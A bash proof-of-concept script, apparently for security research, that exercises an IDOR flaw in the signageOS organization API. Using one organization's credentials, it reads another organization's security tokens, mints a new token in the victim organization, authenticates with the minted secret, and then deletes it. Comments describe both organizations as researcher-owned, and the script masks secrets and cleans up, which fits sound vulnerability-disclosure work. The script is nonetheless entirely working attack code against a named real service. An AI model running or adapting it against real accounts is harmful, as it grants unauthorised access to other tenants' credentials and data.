#!/usr/bin/env bash
# signageos-security-token-idor-poc.sh — run from a trusted machine
AUTH_A='ORG_A_UID:SECRET_A'      # attacker-side org (researcher-owned)
AUTH_B='ORG_B_UID:SECRET_B'      # victim-side org (researcher-owned)
UA="${AUTH_A%%:*}"; UB="${AUTH_B%%:*}"
API=https://api.signageos.io/v1/organization
mask(){ sed -E 's/(securityToken[": ]+)[A-Za-z0-9]+/\1<MASKED>/g'; }

echo "[1] baseline GET A->A"
curl -s -w ' [%{http_code}]\n' -H "X-Auth: $AUTH_A" "$API/$UA/security-token" | mask

echo "[2] READ LEG GET A->B (victim uid, attacker creds)"
curl -s -w ' [%{http_code}]\n' -H "X-Auth: $AUTH_A" "$API/$UB/security-token" | mask

echo "[3] MINT LEG POST A->B (victim uid, attacker creds)"
MINT=$(curl -s -w '\n%{http_code}' -X POST -H "X-Auth: $AUTH_A" \
        -H 'Content-Type: application/json' \
        -d '{"name":"idor-poc"}' "$API/$UB/security-token")
echo "$MINT" | sed '$d' | mask; echo "[$(echo "$MINT" | tail -1)]"

echo "[4] reverse control GET B->A"
curl -s -w ' [%{http_code}]\n' -H "X-Auth: $AUTH_B" "$API/$UA/security-token" | mask

echo "[5] negative control GET A->nonexistent"
curl -s -w ' [%{http_code}]\n' -H "X-Auth: $AUTH_A" "$API/0000000000000000/security-token" | mask

echo "[6] CONFIRMATION: use minted credential against victim org (if step 3 returned one)"
TOKEN_ID=$(echo "$MINT" | sed '$d' | grep -oE '"id"[^,]+' | cut -d'"' -f4)
NEW_SECRET=$(echo "$MINT" | sed '$d' | grep -oE '"securityToken"[^,}]*' | cut -d'"' -f4)
[ -n "$NEW_SECRET" ] && curl -s -o /dev/null -w 'minted-auth GET B->B [%{http_code}]\n' \
    -H "X-Auth: $UB:$NEW_SECRET" "$API/$UB/security-token"

echo "[7] CLEANUP: delete artifact"
[ -n "$TOKEN_ID" ] && curl -s -o /dev/null -w 'DELETE [%{http_code}]\n' \
    -X DELETE -H "X-Auth: $AUTH_A" "$API/$UB/security-token/$TOKEN_ID"

